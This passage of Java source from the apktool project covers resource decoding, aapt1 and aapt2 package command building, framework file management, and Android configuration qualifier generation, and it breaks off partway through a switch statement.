            throw new AndrolibException(ex);
        }
    }

    public void decode(ResTable resTable, ExtFile apkFile, File outDir)
            throws AndrolibException {
        Duo<ResFileDecoder, AXmlResourceParser> duo = getResFileDecoder();
        ResFileDecoder fileDecoder = duo.m1;
        ResAttrDecoder attrDecoder = duo.m2.getAttrDecoder();

        attrDecoder.setCurrentPackage(resTable.listMainPackages().iterator().next());
        Directory inApk, in = null, out;

        try {
            out = new FileDirectory(outDir);

            inApk = apkFile.getDirectory();
            out = out.createDir("res");
            if (inApk.containsDir("res")) {
                in = inApk.getDir("res");
            }
            if (in == null && inApk.containsDir("r")) {
                in = inApk.getDir("r");
            }
            if (in == null && inApk.containsDir("R")) {
                in = inApk.getDir("R");
            }
        } catch (DirectoryException ex) {
            throw new AndrolibException(ex);
        }

        ExtMXSerializer xmlSerializer = getResXmlSerializer();
        for (ResPackage pkg : resTable.listMainPackages()) {
            attrDecoder.setCurrentPackage(pkg);

            LOGGER.info("Decoding file-resources...");
            for (ResResource res : pkg.listFiles()) {
                fileDecoder.decode(res, in, out);
            }

            LOGGER.info("Decoding values */* XMLs...");
            for (ResValuesFile valuesFile : pkg.listValuesFiles()) {
                generateValuesFile(valuesFile, out, xmlSerializer);
            }
            generatePublicXml(pkg, out, xmlSerializer);
        }

        AndrolibException decodeError = duo.m2.getFirstError();
        if (decodeError != null) {
            throw decodeError;
        }
    }

    public void setSdkInfo(Map<String, String> map) {
        if (map != null) {
            mMinSdkVersion = map.get("minSdkVersion");
            mTargetSdkVersion = map.get("targetSdkVersion");
            mMaxSdkVersion = map.get("maxSdkVersion");
        }
    }

    public void setVersionInfo(VersionInfo versionInfo) {
        if (versionInfo != null) {
            mVersionCode = versionInfo.versionCode;
            mVersionName = versionInfo.versionName;
        }
    }

    public void setPackageRenamed(PackageInfo packageInfo) {
        if (packageInfo != null) {
            mPackageRenamed = packageInfo.renameManifestPackage;
        }
    }

    public void setPackageId(PackageInfo packageInfo) {
        if (packageInfo != null) {
            mPackageId = packageInfo.forcedPackageId;
        }
    }

    public void setSharedLibrary(boolean flag) {
        mSharedLibrary = flag;
    }

    public void setSparseResources(boolean flag) {
        mSparseResources = flag;
    }

    public String checkTargetSdkVersionBounds() {
        int target = mapSdkShorthandToVersion(mTargetSdkVersion);

        int min = (mMinSdkVersion != null) ? mapSdkShorthandToVersion(mMinSdkVersion) : 0;
        int max = (mMaxSdkVersion != null) ? mapSdkShorthandToVersion(mMaxSdkVersion) : target;

        target = Math.min(max, target);
        target = Math.max(min, target);
        return Integer.toString(target);
    }

    private File createDoNotCompressExtensionsFile(BuildOptions buildOptions) throws AndrolibException {
        if (buildOptions.doNotCompress == null || buildOptions.doNotCompress.isEmpty()) {
            return null;
        }

        File doNotCompressFile;
        try {
            doNotCompressFile = File.createTempFile("APKTOOL", null);
            doNotCompressFile.deleteOnExit();

            BufferedWriter fileWriter = new BufferedWriter(new FileWriter(doNotCompressFile));
            for (String extension : buildOptions.doNotCompress) {
                fileWriter.write(extension);
                fileWriter.newLine();
            }
            fileWriter.close();

            return doNotCompressFile;
        } catch (IOException ex) {
            throw new AndrolibException(ex);
        }
    }

    private void aapt2Package(File apkFile, File manifest, File resDir, File rawDir, File assetDir, File[] include,
                              List<String> cmd, boolean customAapt)
            throws AndrolibException {

        List<String> compileCommand = new ArrayList<>(cmd);
        File resourcesZip = null;

        if (resDir != null) {
            File buildDir = new File(resDir.getParent(), "build");
            resourcesZip = new File(buildDir, "resources.zip");
        }

        if (resDir != null && !resourcesZip.exists()) {

            // Compile the files into flat arsc files
            cmd.add("compile");

            cmd.add("--dir");
            cmd.add(resDir.getAbsolutePath());

            // Treats error that used to be valid in aapt1 as warnings in aapt2
            cmd.add("--legacy");

            File buildDir = new File(resDir.getParent(), "build");
            resourcesZip = new File(buildDir, "resources.zip");

            cmd.add("-o");
            cmd.add(resourcesZip.getAbsolutePath());

            if (buildOptions.verbose) {
                cmd.add("-v");
            }

            if (buildOptions.noCrunch) {
                cmd.add("--no-crunch");
            }

            try {
                OS.exec(cmd.toArray(new String[0]));
                LOGGER.fine("aapt2 compile command ran: ");
                LOGGER.fine(cmd.toString());
            } catch (BrutException ex) {
                throw new AndrolibException(ex);
            }
        }

        if (manifest == null) {
            return;
        }

        // Link them into the final apk, reusing our old command after clearing for the aapt2 binary
        cmd = new ArrayList<>(compileCommand);
        cmd.add("link");

        cmd.add("-o");
        cmd.add(apkFile.getAbsolutePath());

        if (mPackageId != null && ! mSharedLibrary) {
            cmd.add("--package-id");
            cmd.add(mPackageId);
        }

        if (mSharedLibrary) {
            cmd.add("--shared-lib");
        }

        if (mMinSdkVersion != null) {
            cmd.add("--min-sdk-version");
            cmd.add(mMinSdkVersion);
        }

        if (mTargetSdkVersion != null) {
            cmd.add("--target-sdk-version");
            cmd.add(checkTargetSdkVersionBounds());
        }

        if (mPackageRenamed != null) {
            cmd.add("--rename-manifest-package");
            cmd.add(mPackageRenamed);

            cmd.add("--rename-instrumentation-target-package");
            cmd.add(mPackageRenamed);
        }

        if (mVersionCode != null) {
            cmd.add("--version-code");
            cmd.add(mVersionCode);
        }

        if (mVersionName != null) {
            cmd.add("--version-name");
            cmd.add(mVersionName);
        }

        // Disable automatic changes
        cmd.add("--no-auto-version");
        cmd.add("--no-version-vectors");
        cmd.add("--no-version-transitions");
        cmd.add("--no-resource-deduping");

        cmd.add("--allow-reserved-package-id");

        if (mSparseResources) {
            cmd.add("--enable-sparse-encoding");
        }

        if (buildOptions.isFramework) {
            cmd.add("-x");
        }

        if (buildOptions.doNotCompress != null && !customAapt) {
            // Use custom -e option to avoid limits on commandline length.
            // Can only be used when custom aapt binary is not used.
            String extensionsFilePath = createDoNotCompressExtensionsFile(buildOptions).getAbsolutePath();
            cmd.add("-e");
            cmd.add(extensionsFilePath);
        } else if (buildOptions.doNotCompress != null) {
            for (String file : buildOptions.doNotCompress) {
                cmd.add("-0");
                cmd.add(file);
            }
        }

        if (!buildOptions.resourcesAreCompressed) {
            cmd.add("-0");
            cmd.add("arsc");
        }

        if (include != null) {
            for (File file : include) {
                cmd.add("-I");
                cmd.add(file.getPath());
            }
        }

        cmd.add("--manifest");
        cmd.add(manifest.getAbsolutePath());

        if (assetDir != null) {
            cmd.add("-A");
            cmd.add(assetDir.getAbsolutePath());
        }

        if (rawDir != null) {
            cmd.add("-R");
            cmd.add(rawDir.getAbsolutePath());
        }

        if (buildOptions.verbose) {
            cmd.add("-v");
        }

        if (resourcesZip != null) {
            cmd.add(resourcesZip.getAbsolutePath());
        }

        try {
            OS.exec(cmd.toArray(new String[0]));
            LOGGER.fine("aapt2 link command ran: ");
            LOGGER.fine(cmd.toString());
        } catch (BrutException ex) {
            throw new AndrolibException(ex);
        }
    }

    private void aapt1Package(File apkFile, File manifest, File resDir, File rawDir, File assetDir, File[] include,
                              List<String> cmd, boolean customAapt)
            throws AndrolibException {

        cmd.add("p");

        if (buildOptions.verbose) { // output aapt verbose
            cmd.add("-v");
        }
        if (buildOptions.updateFiles) {
            cmd.add("-u");
        }
        if (buildOptions.debugMode) { // inject debuggable="true" into manifest
            cmd.add("--debug-mode");
        }
        if (buildOptions.noCrunch) {
            cmd.add("--no-crunch");
        }
        // force package id so that some frameworks build with correct id
        // disable if user adds own aapt (can't know if they have this feature)
        if (mPackageId != null && ! customAapt && ! mSharedLibrary) {
            cmd.add("--forced-package-id");
            cmd.add(mPackageId);
        }
        if (mSharedLibrary) {
            cmd.add("--shared-lib");
        }
        if (mMinSdkVersion != null) {
            cmd.add("--min-sdk-version");
            cmd.add(mMinSdkVersion);
        }
        if (mTargetSdkVersion != null) {
            cmd.add("--target-sdk-version");

            // Ensure that targetSdkVersion is between minSdkVersion/maxSdkVersion if
            // they are specified.
            cmd.add(checkTargetSdkVersionBounds());
        }
        if (mMaxSdkVersion != null) {
            cmd.add("--max-sdk-version");
            cmd.add(mMaxSdkVersion);

            // if we have max sdk version, set --max-res-version
            // so we can ignore anything over that during build.
            cmd.add("--max-res-version");
            cmd.add(mMaxSdkVersion);
        }
        if (mPackageRenamed != null) {
            cmd.add("--rename-manifest-package");
            cmd.add(mPackageRenamed);
        }
        if (mVersionCode != null) {
            cmd.add("--version-code");
            cmd.add(mVersionCode);
        }
        if (mVersionName != null) {
            cmd.add("--version-name");
            cmd.add(mVersionName);
        }
        cmd.add("--no-version-vectors");
        cmd.add("-F");
        cmd.add(apkFile.getAbsolutePath());

        if (buildOptions.isFramework) {
            cmd.add("-x");
        }

        if (buildOptions.doNotCompress != null && !customAapt) {
            // Use custom -e option to avoid limits on commandline length.
            // Can only be used when custom aapt binary is not used.
            String extensionsFilePath = createDoNotCompressExtensionsFile(buildOptions).getAbsolutePath();
            cmd.add("-e");
            cmd.add(extensionsFilePath);
        } else if (buildOptions.doNotCompress != null) {
            for (String file : buildOptions.doNotCompress) {
                cmd.add("-0");
                cmd.add(file);
            }
        }

        if (!buildOptions.resourcesAreCompressed) {
            cmd.add("-0");
            cmd.add("arsc");
        }

        if (include != null) {
            for (File file : include) {
                cmd.add("-I");
                cmd.add(file.getPath());
            }
        }
        if (resDir != null) {
            cmd.add("-S");
            cmd.add(resDir.getAbsolutePath());
        }
        if (manifest != null) {
            cmd.add("-M");
            cmd.add(manifest.getAbsolutePath());
        }
        if (assetDir != null) {
            cmd.add("-A");
            cmd.add(assetDir.getAbsolutePath());
        }
        if (rawDir != null) {
            cmd.add(rawDir.getAbsolutePath());
        }
        try {
            OS.exec(cmd.toArray(new String[0]));
            LOGGER.fine("command ran: ");
            LOGGER.fine(cmd.toString());
        } catch (BrutException ex) {
            throw new AndrolibException(ex);
        }
    }

    public void aaptPackage(File apkFile, File manifest, File resDir, File rawDir, File assetDir, File[] include)
            throws AndrolibException {

        String aaptPath = buildOptions.aaptPath;
        boolean customAapt = !aaptPath.isEmpty();
        List<String> cmd = new ArrayList<>();

        try {
            String aaptCommand = AaptManager.getAaptExecutionCommand(aaptPath, getAaptBinaryFile());
            cmd.add(aaptCommand);
        } catch (BrutException ex) {
            LOGGER.warning("aapt: " + ex.getMessage() + " (defaulting to $PATH binary)");
            cmd.add(AaptManager.getAaptBinaryName(getAaptVersion()));
        }

        if (buildOptions.isAapt2()) {
            aapt2Package(apkFile, manifest, resDir, rawDir, assetDir, include, cmd, customAapt);
            return;
        }
        aapt1Package(apkFile, manifest, resDir, rawDir, assetDir, include, cmd, customAapt);
    }

    public void zipPackage(File apkFile, File rawDir, File assetDir)
            throws AndrolibException {

        try {
            ZipUtils.zipFolders(rawDir, apkFile, assetDir, buildOptions.doNotCompress);
        } catch (IOException | BrutException ex) {
            throw new AndrolibException(ex);
        }
    }

    public int getMinSdkVersionFromAndroidCodename(MetaInfo meta, String sdkVersion) {
        int sdkNumber = mapSdkShorthandToVersion(sdkVersion);

        if (sdkNumber == ResConfigFlags.SDK_BASE) {
            return Integer.parseInt(meta.sdkInfo.get("minSdkVersion"));
        }
        return sdkNumber;
    }

    private int mapSdkShorthandToVersion(String sdkVersion) {
        switch (sdkVersion.toUpperCase()) {
            case "M":
                return ResConfigFlags.SDK_MNC;
            case "N":
                return ResConfigFlags.SDK_NOUGAT;
            case "O":
                return ResConfigFlags.SDK_OREO;
            case "P":
                return ResConfigFlags.SDK_P;
            case "Q":
                return ResConfigFlags.SDK_Q;
            case "R":
                return ResConfigFlags.SDK_R;
            case "S":
                return ResConfigFlags.SDK_S;
            case "SV2":
                return ResConfigFlags.SDK_S_V2;
            case "T":
            case "TIRAMISU":
                return ResConfigFlags.SDK_DEVELOPMENT;
            default:
                return Integer.parseInt(sdkVersion);
        }
    }

    public boolean detectWhetherAppIsFramework(File appDir)
            throws AndrolibException {
        File publicXml = new File(appDir, "res/values/public.xml");
        if (! publicXml.exists()) {
            return false;
        }

        Iterator<String> it;
        try {
            it = IOUtils.lineIterator(new FileReader(new File(appDir,
                    "res/values/public.xml")));
        } catch (FileNotFoundException ex) {
            throw new AndrolibException(
                    "Could not detect whether app is framework one", ex);
        }
        it.next();
        it.next();
        return it.next().contains("0x01");
    }

    public Duo<ResFileDecoder, AXmlResourceParser> getResFileDecoder() {
        ResStreamDecoderContainer decoders = new ResStreamDecoderContainer();
        decoders.setDecoder("raw", new ResRawStreamDecoder());
        decoders.setDecoder("9patch", new Res9patchStreamDecoder());

        AXmlResourceParser axmlParser = new AXmlResourceParser();
        axmlParser.setAttrDecoder(new ResAttrDecoder());
        decoders.setDecoder("xml", new XmlPullStreamDecoder(axmlParser, getResXmlSerializer()));

        return new Duo<>(new ResFileDecoder(decoders), axmlParser);
    }

    public Duo<ResFileDecoder, AXmlResourceParser> getManifestFileDecoder(boolean withResources) {
        ResStreamDecoderContainer decoders = new ResStreamDecoderContainer();

        AXmlResourceParser axmlParser = new AndroidManifestResourceParser();
        if (withResources) {
            axmlParser.setAttrDecoder(new ResAttrDecoder());
        }
        decoders.setDecoder("xml", new XmlPullStreamDecoder(axmlParser,getResXmlSerializer()));

        return new Duo<>(new ResFileDecoder(decoders), axmlParser);
    }

    public ExtMXSerializer getResXmlSerializer() {
        ExtMXSerializer serial = new ExtMXSerializer();
        serial.setProperty(ExtXmlSerializer.PROPERTY_SERIALIZER_INDENTATION, "    ");
        serial.setProperty(ExtXmlSerializer.PROPERTY_SERIALIZER_LINE_SEPARATOR, System.getProperty("line.separator"));
        serial.setProperty(ExtXmlSerializer.PROPERTY_DEFAULT_ENCODING, "utf-8");
        serial.setDisabledAttrEscape(true);
        return serial;
    }

    private void generateValuesFile(ResValuesFile valuesFile, Directory out,
                                    ExtXmlSerializer serial) throws AndrolibException {
        try {
            OutputStream outStream = out.getFileOutput(valuesFile.getPath());
            serial.setOutput((outStream), null);
            serial.startDocument(null, null);
            serial.startTag(null, "resources");

            for (ResResource res : valuesFile.listResources()) {
                if (valuesFile.isSynthesized(res)) {
                    continue;
                }
                ((ResValuesXmlSerializable) res.getValue()).serializeToResValuesXml(serial, res);
            }

            serial.endTag(null, "resources");
            serial.newLine();
            serial.endDocument();
            serial.flush();
            outStream.close();
        } catch (IOException | DirectoryException ex) {
            throw new AndrolibException("Could not generate: " + valuesFile.getPath(), ex);
        }
    }

    private void generatePublicXml(ResPackage pkg, Directory out,
                                   XmlSerializer serial) throws AndrolibException {
        try {
            OutputStream outStream = out.getFileOutput("values/public.xml");
            serial.setOutput(outStream, null);
            serial.startDocument(null, null);
            serial.startTag(null, "resources");

            for (ResResSpec spec : pkg.listResSpecs()) {
                serial.startTag(null, "public");
                serial.attribute(null, "type", spec.getType().getName());
                serial.attribute(null, "name", spec.getName());
                serial.attribute(null, "id", String.format("0x%08x", spec.getId().id));
                serial.endTag(null, "public");
            }

            serial.endTag(null, "resources");
            serial.endDocument();
            serial.flush();
            outStream.close();
        } catch (IOException | DirectoryException ex) {
            throw new AndrolibException("Could not generate public.xml file", ex);
        }
    }

    private ResPackage[] getResPackagesFromApk(ExtFile apkFile,ResTable resTable, boolean keepBroken)
            throws AndrolibException {
        try {
            Directory dir = apkFile.getDirectory();
            try (BufferedInputStream bfi = new BufferedInputStream(dir.getFileInput("resources.arsc"))) {
                return ARSCDecoder.decode(bfi, false, keepBroken, resTable).getPackages();
            }
        } catch (DirectoryException | IOException ex) {
            throw new AndrolibException("Could not load resources.arsc from file: " + apkFile, ex);
        }
    }

    public File getFrameworkApk(int id, String frameTag)
            throws AndrolibException {
        File dir = getFrameworkDir();
        File apk;

        if (frameTag != null) {
            apk = new File(dir, String.valueOf(id) + '-' + frameTag + ".apk");
            if (apk.exists()) {
                return apk;
            }
        }

        apk = new File(dir, id + ".apk");
        if (apk.exists()) {
            return apk;
        }

        if (id == 1) {
            try (InputStream in = getAndroidFrameworkResourcesAsStream();
                 OutputStream out = new FileOutputStream(apk)) {
                IOUtils.copy(in, out);
                return apk;
            } catch (IOException ex) {
                throw new AndrolibException(ex);
            }
        }

        throw new CantFindFrameworkResException(id);
    }

    public void emptyFrameworkDirectory() throws AndrolibException {
        File dir = getFrameworkDir();
        File apk;

        apk = new File(dir, "1.apk");

        if (! apk.exists()) {
            LOGGER.warning("Can't empty framework directory, no file found at: " + apk.getAbsolutePath());
        } else {
            try {
                if (apk.exists() && dir.listFiles().length > 1 && ! buildOptions.forceDeleteFramework) {
                    LOGGER.warning("More than default framework detected. Please run command with `--force` parameter to wipe framework directory.");
                } else {
                    for (File file : dir.listFiles()) {
                        if (file.isFile() && file.getName().endsWith(".apk")) {
                            LOGGER.info("Removing " + file.getName() + " framework file...");
                            file.delete();
                        }
                    }
                }
            } catch (NullPointerException e) {
                throw new AndrolibException(e);
            }
        }
    }

    public void listFrameworkDirectory() throws AndrolibException {
        File dir = getFrameworkDir();
        if (dir == null) {
            LOGGER.severe("No framework directory found. Nothing to list.");
            return;
        }

        for (File file : Objects.requireNonNull(dir.listFiles())) {
            if (file.isFile() && file.getName().endsWith(".apk")) {
                LOGGER.info(file.getName());
            }
        }
    }

    public void installFramework(File frameFile) throws AndrolibException {
        installFramework(frameFile, buildOptions.frameworkTag);
    }

    public void installFramework(File frameFile, String tag)
            throws AndrolibException {
        InputStream in = null;
        ZipOutputStream out = null;
        try {
            ZipFile zip = new ZipFile(frameFile);
            ZipEntry entry = zip.getEntry("resources.arsc");

            if (entry == null) {
                throw new AndrolibException("Can't find resources.arsc file");
            }

            in = zip.getInputStream(entry);
            byte[] data = IOUtils.toByteArray(in);

            ARSCData arsc = ARSCDecoder.decode(new ByteArrayInputStream(data), true, true);
            publicizeResources(data, arsc.getFlagsOffsets());

            File outFile = new File(getFrameworkDir(), arsc
                .getOnePackage().getId()
                    + (tag == null ? "" : '-' + tag)
                    + ".apk");

            out = new ZipOutputStream(new FileOutputStream(outFile));
            out.setMethod(ZipOutputStream.STORED);
            CRC32 crc = new CRC32();
            crc.update(data);
            entry = new ZipEntry("resources.arsc");
            entry.setSize(data.length);
            entry.setMethod(ZipOutputStream.STORED);
            entry.setCrc(crc.getValue());
            out.putNextEntry(entry);
            out.write(data);
            out.closeEntry();

            //Write fake AndroidManifest.xml file to support original aapt
            entry = zip.getEntry("AndroidManifest.xml");
            if (entry != null) {
                in = zip.getInputStream(entry);
                byte[] manifest = IOUtils.toByteArray(in);
                CRC32 manifestCrc = new CRC32();
                manifestCrc.update(manifest);
                entry.setSize(manifest.length);
                entry.setCompressedSize(-1);
                entry.setCrc(manifestCrc.getValue());
                out.putNextEntry(entry);
                out.write(manifest);
                out.closeEntry();
            }

            zip.close();
            LOGGER.info("Framework installed to: " + outFile);
        } catch (IOException ex) {
            throw new AndrolibException(ex);
        } finally {
            IOUtils.closeQuietly(in);
            IOUtils.closeQuietly(out);
        }
    }

    public void publicizeResources(File arscFile) throws AndrolibException {
        byte[] data = new byte[(int) arscFile.length()];

        try(InputStream in = new FileInputStream(arscFile);
            OutputStream out = new FileOutputStream(arscFile)) {
            in.read(data);
            publicizeResources(data);
            out.write(data);
        } catch (IOException ex){
            throw new AndrolibException(ex);
        }
    }

    public void publicizeResources(byte[] arsc) throws AndrolibException {
        publicizeResources(arsc, ARSCDecoder.decode(new ByteArrayInputStream(arsc), true, true).getFlagsOffsets());
    }

    public void publicizeResources(byte[] arsc, FlagsOffset[] flagsOffsets) {
        for (FlagsOffset flags : flagsOffsets) {
            int offset = flags.offset + 3;
            int end = offset + 4 * flags.count;
            while (offset < end) {
                arsc[offset] |= (byte) 0x40;
                offset += 4;
            }
        }
    }

    public File getFrameworkDir() throws AndrolibException {
        if (mFrameworkDirectory != null) {
            return mFrameworkDirectory;
        }

        String path;

        // if a framework path was specified on the command line, use it
        if (buildOptions.frameworkFolderLocation != null) {
            path = buildOptions.frameworkFolderLocation;
        } else {
            File parentPath = new File(System.getProperty("user.home"));

            if (OSDetection.isMacOSX()) {
                path = parentPath.getAbsolutePath() + String.format("%1$sLibrary%1$sapktool%1$sframework", File.separatorChar);
            } else if (OSDetection.isWindows()) {
                path = parentPath.getAbsolutePath() + String.format("%1$sAppData%1$sLocal%1$sapktool%1$sframework", File.separatorChar);
            } else {
                path = parentPath.getAbsolutePath() + String.format("%1$s.local%1$sshare%1$sapktool%1$sframework", File.separatorChar);
            }
        }

        File dir = new File(path);

        if (!dir.isDirectory() && dir.isFile()) {
            throw new AndrolibException("--frame-path is set to a file, not a directory.");
        }

        if (dir.getParentFile() != null && dir.getParentFile().isFile()) {
            throw new AndrolibException("Please remove file at " + dir.getParentFile());
        }

        if (! dir.exists()) {
            if (! dir.mkdirs()) {
                if (buildOptions.frameworkFolderLocation != null) {
                    LOGGER.severe("Can't create Framework directory: " + dir);
                }
                throw new AndrolibException(String.format(
                        "Can't create directory: (%s). Pass a writable path with --frame-path {DIR}. ", dir
                ));
            }
        }

        if (buildOptions.frameworkFolderLocation == null) {
            if (! dir.canWrite()) {
                LOGGER.severe(String.format("WARNING: Could not write to (%1$s), using %2$s instead...",
                        dir.getAbsolutePath(), System.getProperty("java.io.tmpdir")));
                LOGGER.severe("Please be aware this is a volatile directory and frameworks could go missing, " +
                        "please utilize --frame-path if the default storage directory is unavailable");

                dir = new File(System.getProperty("java.io.tmpdir"));
            }
        }

        mFrameworkDirectory = dir;
        return dir;
    }

    private File getAaptBinaryFile() throws AndrolibException {
        try {
            if (getAaptVersion() == 2) {
                return AaptManager.getAapt2();
            }
            return AaptManager.getAapt1();
        } catch (BrutException ex) {
            throw new AndrolibException(ex);
        }
    }

    private int getAaptVersion() {
        return buildOptions.isAapt2() ? 2 : 1;
    }

    public InputStream getAndroidFrameworkResourcesAsStream() {
        return Jar.class.getResourceAsStream("/brut/androlib/android-framework.jar");
    }

    public void close() throws IOException {
        if (mFramework != null) {
            mFramework.close();
        }
    }

    public BuildOptions buildOptions;

    // TODO: dirty static hack. I have to refactor decoding mechanisms.
    public static boolean sKeepBroken = false;

    private final static Logger LOGGER = Logger.getLogger(AndrolibResources.class.getName());

    private File mFrameworkDirectory = null;

    private ExtFile mFramework = null;

    private String mMinSdkVersion = null;
    private String mMaxSdkVersion = null;
    private String mTargetSdkVersion = null;
    private String mVersionCode = null;
    private String mVersionName = null;
    private String mPackageRenamed = null;
    private String mPackageId = null;

    private boolean mSharedLibrary = false;
    private boolean mSparseResources = false;

    private final static String[] IGNORED_PACKAGES = new String[] {
            "android", "com.htc", "com.lge", "com.lge.internal", "yi", "flyme", "air.com.adobe.appentry",
            "FFFFFFFFFFFFFFFFFFFFFF" };
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/res/data/ResConfigFlags.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res.data;

import java.util.logging.Logger;

public class ResConfigFlags {
    public final short mcc;
    public final short mnc;

    public final char[] language;
    public final char[] region;

    public final byte orientation;
    public final byte touchscreen;
    public final int density;

    public final byte keyboard;
    public final byte navigation;
    public final byte inputFlags;

    public final short screenWidth;
    public final short screenHeight;

    public final short sdkVersion;

    public final byte screenLayout;
    public final byte uiMode;
    public final short smallestScreenWidthDp;

    public final short screenWidthDp;
    public final short screenHeightDp;

    private final char[] localeScript;
    private final char[] localeVariant;

    private final byte screenLayout2;
    private final byte colorMode;

    public final boolean isInvalid;

    private final String mQualifiers;

    private final int size;

    public ResConfigFlags() {
        mcc = 0;
        mnc = 0;
        language = new char[] { '\00', '\00' };
        region = new char[] { '\00', '\00' };
        orientation = ORIENTATION_ANY;
        touchscreen = TOUCHSCREEN_ANY;
        density = DENSITY_DEFAULT;
        keyboard = KEYBOARD_ANY;
        navigation = NAVIGATION_ANY;
        inputFlags = KEYSHIDDEN_ANY | NAVHIDDEN_ANY;
        screenWidth = 0;
        screenHeight = 0;
        sdkVersion = 0;
        screenLayout = SCREENLONG_ANY | SCREENSIZE_ANY;
        uiMode = UI_MODE_TYPE_ANY | UI_MODE_NIGHT_ANY;
        smallestScreenWidthDp = 0;
        screenWidthDp = 0;
        screenHeightDp = 0;
        localeScript = null;
        localeVariant = null;
        screenLayout2 = 0;
        colorMode = COLOR_WIDE_UNDEFINED;
        isInvalid = false;
        mQualifiers = "";
        size = 0;
    }

    public ResConfigFlags(short mcc, short mnc, char[] language,
                          char[] region, byte orientation,
                          byte touchscreen, int density, byte keyboard, byte navigation,
                          byte inputFlags, short screenWidth, short screenHeight,
                          short sdkVersion, byte screenLayout, byte uiMode,
                          short smallestScreenWidthDp, short screenWidthDp,
                          short screenHeightDp, char[] localeScript, char[] localeVariant,
                          byte screenLayout2, byte colorMode, boolean isInvalid, int size) {
        if (orientation < 0 || orientation > 3) {
            LOGGER.warning("Invalid orientation value: " + orientation);
            orientation = 0;
            isInvalid = true;
        }
        if (touchscreen < 0 || touchscreen > 3) {
            LOGGER.warning("Invalid touchscreen value: " + touchscreen);
            touchscreen = 0;
            isInvalid = true;
        }
        if (density < -1) {
            LOGGER.warning("Invalid density value: " + density);
            density = 0;
            isInvalid = true;
        }
        if (keyboard < 0 || keyboard > 3) {
            LOGGER.warning("Invalid keyboard value: " + keyboard);
            keyboard = 0;
            isInvalid = true;
        }
        if (navigation < 0 || navigation > 4) {
            LOGGER.warning("Invalid navigation value: " + navigation);
            navigation = 0;
            isInvalid = true;
        }

        if (localeScript != null && localeScript.length != 0) {
            if (localeScript[0] == '\00') {
                localeScript = null;
            }
        } else {
            localeScript = null;
        }

        if (localeVariant != null && localeVariant.length != 0) {
            if (localeVariant[0] == '\00') {
                localeVariant = null;
            }
        }  else {
            localeVariant = null;
        }

        this.mcc = mcc;
        this.mnc = mnc;
        this.language = language;
        this.region = region;
        this.orientation = orientation;
        this.touchscreen = touchscreen;
        this.density = density;
        this.keyboard = keyboard;
        this.navigation = navigation;
        this.inputFlags = inputFlags;
        this.screenWidth = screenWidth;
        this.screenHeight = screenHeight;
        this.sdkVersion = sdkVersion;
        this.screenLayout = screenLayout;
        this.uiMode = uiMode;
        this.smallestScreenWidthDp = smallestScreenWidthDp;
        this.screenWidthDp = screenWidthDp;
        this.screenHeightDp = screenHeightDp;
        this.localeScript = localeScript;
        this.localeVariant = localeVariant;
        this.screenLayout2 = screenLayout2;
        this.colorMode = colorMode;
        this.isInvalid = isInvalid;
        this.size = size;
        mQualifiers = generateQualifiers();
    }

    public String getQualifiers() {
        return mQualifiers;
    }

    private String generateQualifiers() {
        StringBuilder ret = new StringBuilder();
        if (mcc != 0) {
            ret.append("-mcc").append(String.format("%03d", mcc));
            if (mnc != MNC_ZERO) {
                if (mnc != 0) {
                    ret.append("-mnc");
                    if (size <= 32) {
                        if (mnc > 0 && mnc < 10) {
                            ret.append(String.format("%02d", mnc));
                        } else {
                            ret.append(String.format("%03d", mnc));
                        }
                    } else {
                        ret.append(mnc);
                    }
                }
            } else {
                ret.append("-mnc00");
            }
        } else {
            if (mnc != 0) {
                ret.append("-mnc").append(mnc);
            }
        }
        ret.append(getLocaleString());

        switch (screenLayout & MASK_LAYOUTDIR) {
            case SCREENLAYOUT_LAYOUTDIR_RTL:
                ret.append("-ldrtl");
                break;
            case SCREENLAYOUT_LAYOUTDIR_LTR:
                ret.append("-ldltr");
                break;
        }
        if (smallestScreenWidthDp != 0) {
            ret.append("-sw").append(smallestScreenWidthDp).append("dp");
        }
        if (screenWidthDp != 0) {
            ret.append("-w").append(screenWidthDp).append("dp");
        }
        if (screenHeightDp != 0) {
            ret.append("-h").append(screenHeightDp).append("dp");
        }
        switch (screenLayout & MASK_SCREENSIZE) {
            case SCREENSIZE_SMALL:
                ret.append("-small");
                break;
            case SCREENSIZE_NORMAL:
                ret.append("-normal");
                break;
            case SCREENSIZE_LARGE:
                ret.append("-large");
                break;
            case SCREENSIZE_XLARGE:
                ret.append("-xlarge");
                break;
        }
        switch (screenLayout & MASK_SCREENLONG) {
            case SCREENLONG_YES:
                ret.append("-long");
                break;
            case SCREENLONG_NO:
                ret.append("-notlong");
                break;
        }
        switch (screenLayout2 & MASK_SCREENROUND) {
            case SCREENLAYOUT_ROUND_NO:
                ret.append("-notround");
                break;
            case SCREENLAYOUT_ROUND_YES:
                ret.append("-round");
                break;
        }
        switch (colorMode & COLOR_HDR_MASK) {
            case COLOR_HDR_YES:
                ret.append("-highdr");
                break;
            case COLOR_HDR_NO:
                ret.append("-lowdr");
                break;
        }
        switch (colorMode & COLOR_WIDE_MASK) {
            case COLOR_WIDE_YES:
                ret.append("-widecg");
                break;
            case COLOR_WIDE_NO:
                ret.append("-nowidecg");
                break;
        }
        switch (orientation) {
            case ORIENTATION_PORT:
                ret.append("-port");
                break;
            case ORIENTATION_LAND:
                ret.append("-land");
                break;
            case ORIENTATION_SQUARE:
                ret.append("-square");
                break;
        }
        switch (uiMode & MASK_UI_MODE_TYPE) {
            case UI_MODE_TYPE_CAR:
                ret.append("-car");
                break;
            case UI_MODE_TYPE_DESK:
                ret.append("-desk");
                break;
            case UI_MODE_TYPE_TELEVISION:
                ret.append("-television");
                break;
            case UI_MODE_TYPE_SMALLUI:
                ret.append("-smallui");
                break;
            case UI_MODE_TYPE_MEDIUMUI:
                ret.append("-mediumui");
                break;
            case UI_MODE_TYPE_LARGEUI:
                ret.append("-largeui");
                break;
            case UI_MODE_TYPE_GODZILLAUI:
                ret.append("-godzillaui");
                break;
            case UI_MODE_TYPE_HUGEUI:
                ret.append("-hugeui");
                break;
